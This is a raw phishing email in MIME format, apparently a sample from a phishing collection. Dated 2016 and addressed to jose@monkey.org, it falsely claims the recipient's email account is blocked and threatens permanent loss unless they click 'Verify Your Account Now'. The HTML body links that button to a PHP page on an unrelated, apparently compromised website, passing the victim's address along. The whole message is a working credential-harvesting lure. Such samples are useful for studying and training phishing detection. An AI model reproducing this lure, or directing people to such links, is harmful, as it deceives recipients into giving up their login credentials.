@@ -1,0 +1,267 @@
+Return-Path: info@kab.be
+Delivered-To: jose@monkey.org
+X-FDA: 71829830142.09.camp58_702a9b7448342
+X-Spam-Summary: 50,0,0,a8e274d8038534f7,d41d8cd98f00b204,info@kab.be,:,RULES_HIT:4:41:72:379:495:800:962:967:973:983:988:989:1189:1208:1221:1254:1260:1263:1313:1314:1381:1431:1433:1434:1436:1437:1516:1517:1518:1566:1571:1575:1588:1589:1592:1594:1714:1730:1749:1776:1792:1803:2107:2145:2198:2199:2525:2527:2539:2549:2560:2563:2638:2693:2890:2898:2915:2926:2945:3040:3138:3139:3140:3141:3142:3651:3867:3871:3873:3936:3953:4042:4321:4384:4552:4605:5007:6119:6261:6678:6703:7809:8518:8603:8957:8987:9040:9080:9149:9388:9908:10004:10049:10234:10346:11473:11657:11658:11914:12043:12073:12075:12438:12517:12519:12555:12660:12740:12764:13018:13019:13025:13139:13237:13439:13975:14596:14827:21068:21080:21212:21433:21451:30001:30003:30012:30021:30022:30026:30054:30069:30070:30075,0,RBL:199.223.212.116:@kab.be:.lbl8.mailshell.net-62.2.255.100 64.100.201.201,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:fp,MSBL:0,DNSBL:neutral,Custom_rules:0:0:0,LFtime:72,LUA_SUMMARY:none
+X-HE-Tag: camp58_702a9b7448342
+X-Filterd-Recvd-Size: 15243
+Received: from server1.fireblade.be (unknown [199.223.212.116])
+	by imf22.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Tue,  9 Aug 2016 16:06:10 +0000 (UTC)
+Received: from ec2-52-25-202-207.us-west-2.compute.amazonaws.com ([52.25.202.207]:53411 helo=openam.example.com)
+	by server1.fireblade.be with esmtpsa (TLSv1:DHE-RSA-AES256-SHA:256)
+	(Exim 4.87)
+	(envelope-from <info@kab.be>)
+	id 1bX9Xc-0003ZP-GJ
+	for jose@monkey.org; Tue, 09 Aug 2016 18:06:08 +0200
+Content-Type: multipart/alternative; boundary="===============1943882270=="
+MIME-Version: 1.0
+Subject: Email Notification
+To: jose@monkey.org
+From: "E-Mail Notice " <info@kab.be>
+Date: Wed, 10 Aug 2016 00:06:57 +0800
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - server1.fireblade.be
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - kab.be
+X-Get-Message-Sender-Via: server1.fireblade.be: authenticated_id: info@kab.be
+X-Authenticated-Sender: server1.fireblade.be: info@kab.be
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 325
+
+You will not see this in a MIME-aware mail reader.
+--===============1943882270==
+Content-Type: text/plain; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+ =
+
+         =
+
+       =
+
+    , =
+
+
+    Your Account jose@monkey.org Has Been Blocked!
+   Your account has been Blocked due to system error CODE: YB261729285. If =
+you would like to continue using your Email Address,
+    =
+
+    Verify Your Account Now
+   YOU WILL COMPLETELY LOSE YOUR EMAIL ADDRESS IF NO ACTION IS TAKEN.
+
+   Sincerely,
+   Mail Team! Inc =A92015 All Rights Reserved
+
+
+
+
+--===============1943882270==
+Content-Type: text/html; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<HTML><HEAD><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=
+=3Diso-8859-1"/></HEAD>
+<BODY><P id=3Dyui_3_13_0_6_1397165451840_13><SPAN id=3Dyiv9110452907yui_3_1=
+3_0_1_1396370716649_2382 title=3D"" class=3Dyiv9110452907lozenge-static></S=
+PAN>&nbsp;</P>
+<DIV id=3Dyui_3_13_0_6_1397165451840_18 class=3Dyui_3_13_0_6_1397165451840_=
+17 style=3D"FONT-SIZE: 12pt; FONT-FAMILY: HelveticaNeue-Light, Helvetica Ne=
+ue Light, Helvetica Neue, Helvetica, Arial, Lucida Grande, sans-serif">
+<DIV id=3Dyui_3_13_0_1_1397165451840_2887 class=3Dyui_3_13_0_1_139716545184=
+0_2783 style=3D"FONT-SIZE: 12pt; FONT-FAMILY: HelveticaNeue-Light, Helvetic=
+a Neue Light, Helvetica Neue, Helvetica, Arial, Lucida Grande, sans-serif">
+<DIV id=3Dyui_3_13_0_1_1397165451840_2886 class=3Dy_msg_container>
+<DIV id=3Dyiv9110452907>
+<DIV id=3Dyui_3_13_0_1_1397165451840_2885>
+<DIV id=3Dyiv9110452907yui_3_13_0_1_1396370716649_2320 class=3Dyiv911045290=
+7base-card-body>
+<DIV id=3Dyiv9110452907yui_3_13_0_1_1396370716649_2319 class=3D"yiv91104529=
+07msg-body yiv9110452907inner  yiv9110452907undoreset">
+<DIV id=3Dyiv9110452907>
+<DIV id=3Dyiv9110452907yui_3_13_0_1_1396370716649_2318><BR>
+<DIV id=3Dyiv9110452907yui_3_13_0_1_1396343091554_2781 class=3D"yiv91104529=
+07yui_3_13_0_8_1396232738906_33 yui_3_13_0_1_1397165451840_2789" style=3D"F=
+ONT-SIZE: 14pt; FONT-FAMILY: garamond, new york, times, serif">
+<DIV id=3Dyiv9110452907yui_3_13_0_1_1396343091554_2780 class=3D"yiv91104529=
+07yui_3_13_0_1_1396232738906_3241 yui_3_13_0_1_1397165451840_2790" style=3D=
+"FONT-SIZE: 12pt; FONT-FAMILY: HelveticaNeue, Helvetica Neue, Helvetica, Ar=
+ial, Lucida Grande, sans-serif">
+<DIV id=3Dyiv9110452907yui_3_13_0_1_1396343091554_2779 class=3Dyiv911045290=
+7y_msg_container>
+<DIV id=3Dyiv9110452907>
+<DIV id=3Dyiv9110452907yui_3_13_0_1_1396343091554_2778>
+<DIV id=3Dyiv9110452907yui_3_13_0_1_1396343091554_2777 class=3D"yiv91104529=
+07yui_3_13_0_1_1396232738906_3247 yui_3_13_0_1_1397165451840_2791" style=3D=
+"FONT-SIZE: 8pt; FONT-FAMILY: HelveticaNeue-Light, Helvetica Neue Light, He=
+lvetica Neue, Helvetica, Arial, Lucida Grande, sans-serif; COLOR: #000; BAC=
+KGROUND-COLOR: #fff">
+<TABLE id=3Dyiv9110452907yui_3_13_0_ym1_1_1393800238636_1722 class=3D"yiv91=
+10452907yui_3_13_0_1_1396232738906_3248 yui_3_13_0_1_1397165451840_2792" st=
+yle=3D"WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: separate; T=
+EXT-TRANSFORM: none; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; PADDING-TOP: 0=
+px; FONT: 13px 'Helvetica Neue', 'Segoe UI', Helvetica, Arial, 'Lucida Gran=
+de', sans-serif; PADDING-LEFT: 0px; DISPLAY: table; LETTER-SPACING: normal;=
+ PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px" =
+dir=3Dltr align=3Dcenter>
+<P><SPAN id=3Dyiv2486292201yui_3_16_0_1_1409874957895_2912 class=3Dyiv24862=
+92201 style=3D"FONT-SIZE: 12pt; LINE-HEIGHT: 22px">
+<TBODY>
+<TR>
+<TD align=3Dcenter><FONT color=3D#585858><STRONG><FONT color=3D#000000></FO=
+NT></STRONG>,</FONT></SPAN> =
+
+<P></P></TD></TR>
+<TBODY id=3Dyiv9110452907yui_3_13_0_ym1_1_1393800238636_1721 style=3D"WIDTH=
+: 588px">
+<TR id=3Dyiv9110452907yui_3_13_0_ym1_1_1393800238636_1727 style=3D"VERTICAL=
+-ALIGN: inherit; DISPLAY: table-row">
+<TD id=3Dyiv9110452907i2 class=3D"yiv9110452907yui_3_13_0_1_1396232738906_3=
+251 yui_3_13_0_1_1397165451840_2795" style=3D"FONT-SIZE: 41px; FONT-FAMILY:=
+ 'Segoe UI Light', 'Segoe UI', 'Helvetica Neue Medium', Arial, sans-serif; =
+COLOR: rgb(38,114,236); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT=
+: 0px; BORDER-SPACING: 2px; DISPLAY: table-cell; PADDING-RIGHT: 0px">
+<DIV id=3Dyiv9110452907yui_3_13_0_ym1_1_1395271338439_3345 style=3D"PADDING=
+-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; DISPLAY: bl=
+ock; LINE-HEIGHT: normal; PADDING-RIGHT: 0px" align=3Dcenter>Your Account <=
+STRONG>jose@monkey.org</STRONG> Has Been Blocked!</DIV></TD></TR>
+<TR id=3Dyiv9110452907yui_3_13_0_ym1_1_1393800238636_1726 style=3D"VERTICAL=
+-ALIGN: inherit; DISPLAY: table-row">
+<TD id=3Dyiv9110452907i4 class=3D"yiv9110452907yui_3_13_0_1_1396232738906_3=
+254 yui_3_13_0_1_1397165451840_2798" style=3D"FONT-SIZE: 14px; FONT-FAMILY:=
+ 'Segoe UI', Tahoma, Verdana, Arial, sans-serif; COLOR: rgb(42,42,42); PADD=
+ING-BOTTOM: 0px; PADDING-TOP: 25px; PADDING-LEFT: 0px; BORDER-SPACING: 2px;=
+ DISPLAY: table-cell; PADDING-RIGHT: 0px">
+<DIV id=3Dyiv9110452907yui_3_13_0_ym1_1_1395879694665_7915 style=3D"PADDING=
+-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; DISPLAY: bl=
+ock; LINE-HEIGHT: normal; PADDING-RIGHT: 0px" align=3Dcenter><SPAN id=3Dyiv=
+9110452907yui_3_13_0_ym1_1_1395229056957_2565 class=3D"yiv9110452907yui_3_1=
+3_0_ym1_1_1395231935017_5634 yiv9110452907yui_3_13_0_1_1396232738906_3256 y=
+ui_3_13_0_1_1397165451840_2800" style=3D"FONT-SIZE: 12pt; FONT-FAMILY: Corb=
+el; COLOR: rgb(69,69,69); BACKGROUND-COLOR: rgb(255,255,255)">Your&nbsp;acc=
+ount has been&nbsp;Blocked due to system error CODE:<SPAN class=3Dyiv911045=
+2907Apple-converted-space>&nbsp;</SPAN></SPAN><SPAN id=3Dyiv9110452907yui_3=
+_13_0_ym1_1_1395231935017_5672 class=3D"yiv9110452907yui_3_13_0_ym1_1_13952=
+31935017_5635 yiv9110452907yui_3_13_0_1_1396232738906_3257 yui_3_13_0_1_139=
+7165451840_2801" style=3D"FONT-SIZE: 12pt; FONT-FAMILY: Arial; FONT-WEIGHT:=
+ bold; COLOR: rgb(255,0,0); BACKGROUND-COLOR: rgb(255,255,255)">YB261729285=
+</SPAN><SPAN id=3Dyiv9110452907yui_3_13_0_ym1_1_1395229056957_2567 class=3D=
+"yiv9110452907yui_3_13_0_ym1_1_1395231935017_5636 yiv9110452907yui_3_13_0_1=
+_1396232738906_3258 yui_3_13_0_1_1397165451840_2802" style=3D"FONT-SIZE: 12=
+pt; FONT-FAMILY: Corbel; COLOR: rgb(69,69,69)">.</SPAN></DIV>
+<DIV id=3Dyiv9110452907yui_3_13_0_ym1_1_1395271338439_3339 style=3D"PADDING=
+-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; DISPLAY: bl=
+ock; LINE-HEIGHT: normal; PADDING-RIGHT: 0px" align=3Dcenter><SPAN id=3Dyiv=
+9110452907yui_3_13_0_ym1_1_1395271338439_3338 class=3D"yiv9110452907yui_3_1=
+3_0_ym1_1_1395231935017_5636 yiv9110452907yui_3_13_0_1_1396232738906_3260 y=
+ui_3_13_0_1_1397165451840_2804" style=3D"FONT-SIZE: 12pt; FONT-FAMILY: Corb=
+el; COLOR: rgb(69,69,69); BACKGROUND-COLOR: rgb(255,255,255)"><SPAN id=3Dyi=
+v9110452907yui_3_13_0_ym1_1_1395229056957_2567 class=3D"yiv9110452907yui_3_=
+13_0_ym1_1_1395231935017_5636 yiv9110452907yui_3_13_0_1_1396232738906_3261 =
+yui_3_13_0_1_1397165451840_2805" style=3D"FONT-SIZE: 12pt; FONT-FAMILY: Cor=
+bel; COLOR: rgb(69,69,69); BACKGROUND-COLOR: rgb(255,255,255)">If you would=
+ like to continue using your Email Address,</SPAN></SPAN></DIV></TD></TR>
+<TR id=3Dyiv9110452907yui_3_13_0_ym1_1_1393800238636_1720 style=3D"VERTICAL=
+-ALIGN: inherit; DISPLAY: table-row">
+<TD id=3Dyiv9110452907yui_3_13_0_ym1_1_1393800238636_1719 class=3D"yiv91104=
+52907yui_3_13_0_1_1396232738906_3263 yui_3_13_0_1_1397165451840_2807" style=
+=3D"FONT-SIZE: 14px; FONT-FAMILY: 'Segoe UI', Tahoma, Verdana, Arial, sans-=
+serif; COLOR: rgb(42,42,42); PADDING-BOTTOM: 0px; PADDING-TOP: 25px; PADDIN=
+G-LEFT: 0px; BORDER-SPACING: 2px; DISPLAY: table-cell; PADDING-RIGHT: 0px">
+<DIV id=3Dyiv9110452907yui_3_13_0_ym1_1_1395621260074_5838 align=3Dcenter>
+<TABLE id=3Dyiv9110452907yui_3_13_0_ym1_1_1393800238636_1789 style=3D"BORDE=
+R-COLLAPSE: separate; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: =
+0px; DISPLAY: table; PADDING-RIGHT: 0px" cellSpacing=3D0 align=3Dcenter bor=
+der=3D0>
+<TBODY id=3Dyiv9110452907yui_3_13_0_ym1_1_1393800238636_1788 style=3D"WIDTH=
+: 204px">
+<TR id=3Dyiv9110452907yui_3_13_0_ym1_1_1393800238636_1787 style=3D"VERTICAL=
+-ALIGN: inherit; DISPLAY: table-row">
+<TD id=3Dyiv9110452907yui_3_13_0_ym1_1_1393800238636_1786 style=3D"MIN-WIDT=
+H: 50px; PADDING-BOTTOM: 5px; PADDING-TOP: 5px; PADDING-LEFT: 20px; BORDER-=
+SPACING: 2px; DISPLAY: table-cell; PADDING-RIGHT: 20px; BACKGROUND-COLOR: r=
+gb(38,114,236)" bgColor=3D#2672ec>
+<DIV id=3Dyiv9110452907yui_3_13_0_ym1_1_1395879694665_7914 style=3D"PADDING=
+-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; DISPLAY: bl=
+ock; LINE-HEIGHT: normal; PADDING-RIGHT: 0px" align=3Dcenter><A id=3Dyiv911=
+0452907i5 class=3D"yiv9110452907yui_3_13_0_1_1396232738906_3269 yui_3_13_0_=
+1_1397165451840_2813" style=3D"FONT-SIZE: 14px; TEXT-DECORATION: none; FONT=
+-FAMILY: 'Segoe UI Semibold', 'Segoe UI Bold', 'Segoe UI', 'Helvetica Neue =
+Medium', Arial, sans-serif; FONT-WEIGHT: 600; COLOR: rgb(255,255,255); OUTL=
+INE-WIDTH: medium; PADDING-BOTTOM: 0px; TEXT-ALIGN: center; PADDING-TOP: 0p=
+x; OUTLINE-STYLE: none; PADDING-LEFT: 0px; MARGIN: 0px; LETTER-SPACING: 0.0=
+2em; OUTLINE-COLOR: invert; PADDING-RIGHT: 0px" href=3D"http://osapeninsula=
+sportfishing.com/wp-content/upgrade/Counter/index.php?email=3Djose@monkey.o=
+rg" target=3D_blank>Verify<SPAN class=3Dyiv9110452907Apple-converted-space>=
+&nbsp;</SPAN><SPAN id=3Dyiv9110452907yui_3_13_0_ym1_1_1393800238636_1785 di=
+r=3Dltr>Your Account Now</SPAN></A></DIV></TD></TR></TBODY></TABLE></DIV></=
+TD></TR>
+<TR id=3Dyiv9110452907yui_3_13_0_ym1_1_1393800238636_1826 style=3D"VERTICAL=
+-ALIGN: inherit; DISPLAY: table-row">
+<TD id=3Dyiv9110452907i6 class=3D"yiv9110452907yui_3_13_0_1_1396232738906_3=
+271 yui_3_13_0_1_1397165451840_2815" style=3D"FONT-SIZE: 14px; FONT-FAMILY:=
+ 'Segoe UI', Tahoma, Verdana, Arial, sans-serif; COLOR: rgb(42,42,42); PADD=
+ING-BOTTOM: 0px; PADDING-TOP: 25px; PADDING-LEFT: 0px; BORDER-SPACING: 2px;=
+ DISPLAY: table-cell; PADDING-RIGHT: 0px">
+<DIV id=3Dyiv9110452907yui_3_13_0_ym1_1_1395229056957_2573 class=3Dyiv91104=
+52907p0 style=3D"MARGIN-BOTTOM: 0pt; TEXT-ALIGN: center; MARGIN-TOP: 0pt; B=
+ACKGROUND-COLOR: rgb(255,255,255)"><SPAN id=3Dyiv9110452907yui_3_13_0_ym1_1=
+_1395229056957_2572 class=3D"yiv9110452907yui_3_13_0_ym1_1_1395231935017_56=
+43 yiv9110452907yui_3_13_0_1_1396232738906_3273 yui_3_13_0_1_1397165451840_=
+2817" style=3D"FONT-SIZE: 12pt; FONT-FAMILY: Corbel; FONT-WEIGHT: bold; COL=
+OR: rgb(69,69,69); BACKGROUND-COLOR: rgb(255,255,255)">YOU WILL COMPLETELY&=
+nbsp;LOSE YOUR EMAIL ADDRESS IF NO ACTION IS TAKEN.</SPAN><SPAN id=3Dyiv911=
+0452907yui_3_13_0_ym1_1_1395229056957_2575 class=3D"yiv9110452907yui_3_13_0=
+_ym1_1_1395231935017_5647 yiv9110452907yui_3_13_0_1_1396232738906_3274 yui_=
+3_13_0_1_1397165451840_2818" style=3D"FONT-SIZE: 12pt; FONT-FAMILY: Corbel;=
+ COLOR: rgb(69,69,69); BACKGROUND-COLOR: rgb(255,255,255)"><BR></SPAN></DIV=
+></TD></TR>
+<TR id=3Dyiv9110452907yui_3_13_0_ym1_1_1393800238636_1998 style=3D"VERTICAL=
+-ALIGN: inherit; DISPLAY: table-row">
+<TD id=3Dyiv9110452907yui_3_13_0_ym1_1_1393800238636_1997 class=3D"yiv91104=
+52907yui_3_13_0_1_1396232738906_3276 yui_3_13_0_1_1397165451840_2820" style=
+=3D"FONT-SIZE: 14px; FONT-FAMILY: 'Segoe UI', Tahoma, Verdana, Arial, sans-=
+serif; COLOR: rgb(42,42,42); PADDING-BOTTOM: 0px; PADDING-TOP: 25px; PADDIN=
+G-LEFT: 0px; BORDER-SPACING: 2px; DISPLAY: table-cell; PADDING-RIGHT: 0px">
+<DIV id=3Dyiv9110452907yui_3_13_0_ym1_1_1395621260074_5837 style=3D"PADDING=
+-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; DISPLAY: bl=
+ock; LINE-HEIGHT: normal; PADDING-RIGHT: 0px" align=3Dcenter>Sincerely,</DI=
+V></TD></TR>
+<TR id=3Dyiv9110452907yui_3_13_0_ym1_1_1393800238636_1999 style=3D"VERTICAL=
+-ALIGN: inherit; DISPLAY: table-row">
+<TD id=3Dyiv9110452907i8 class=3D"yiv9110452907yui_3_13_0_1_1396232738906_3=
+279 yui_3_13_0_1_1397165451840_2823" style=3D"FONT-SIZE: 14px; FONT-FAMILY:=
+ 'Segoe UI', Tahoma, Verdana, Arial, sans-serif; COLOR: rgb(42,42,42); PADD=
+ING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-SPACING: 2px; =
+DISPLAY: table-cell; PADDING-RIGHT: 0px">
+<DIV id=3Dyiv9110452907yui_3_13_0_ym1_1_1395621260074_5835 style=3D"PADDING=
+-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; DISPLAY: bl=
+ock; LINE-HEIGHT: normal; PADDING-RIGHT: 0px" align=3Dcenter><SPAN id=3Dyiv=
+9110452907yui_3_13_0_ym1_1_1395231935017_5800 class=3D"yiv9110452907yui_3_1=
+3_0_ym1_1_1395231935017_5649 yiv9110452907yui_3_13_0_1_1396232738906_3281 y=
+ui_3_13_0_1_1397165451840_2825" style=3D"FONT-SIZE: 12pt; FONT-FAMILY: Cand=
+ara; COLOR: rgb(69,69,69); BACKGROUND-COLOR: rgb(255,255,255)">Mail Team! I=
+nc<SPAN class=3Dyiv9110452907Apple-converted-space>&nbsp;</SPAN></SPAN><SPA=
+N class=3D"yiv9110452907yui_3_13_0_ym1_1_1395231935017_5650 yiv9110452907yu=
+i_3_13_0_1_1396232738906_3282 yui_3_13_0_1_1397165451840_2826" style=3D"FON=
+T-SIZE: 12pt; FONT-FAMILY: Corbel; COLOR: rgb(69,69,69); BACKGROUND-COLOR: =
+rgb(255,255,255)">=A9<FONT face=3DCorbel>201</FONT>5</SPAN><SPAN id=3Dyiv91=
+10452907yui_3_13_0_ym1_10_1395231935017_20 class=3D"yiv9110452907yui_3_13_0=
+_ym1_1_1395231935017_5652 yiv9110452907yui_3_13_0_1_1396232738906_3284 yui_=
+3_13_0_1_1397165451840_2828" style=3D"FONT-SIZE: 12pt; FONT-FAMILY: Candara=
+; COLOR: rgb(69,69,69); BACKGROUND-COLOR: rgb(255,255,255)"><SPAN class=3Dy=
+iv9110452907Apple-converted-space>&nbsp;</SPAN>All Rights Reserved</SPAN></=
+DIV></TD></TR></TBODY></P></TABLE></DIV></DIV></DIV></DIV></DIV></DIV></DIV=
+></DIV></DIV></DIV></DIV></DIV><BR><BR></DIV></DIV></DIV></SPAN></BODY></HT=
+ML>
+--===============1943882270==--
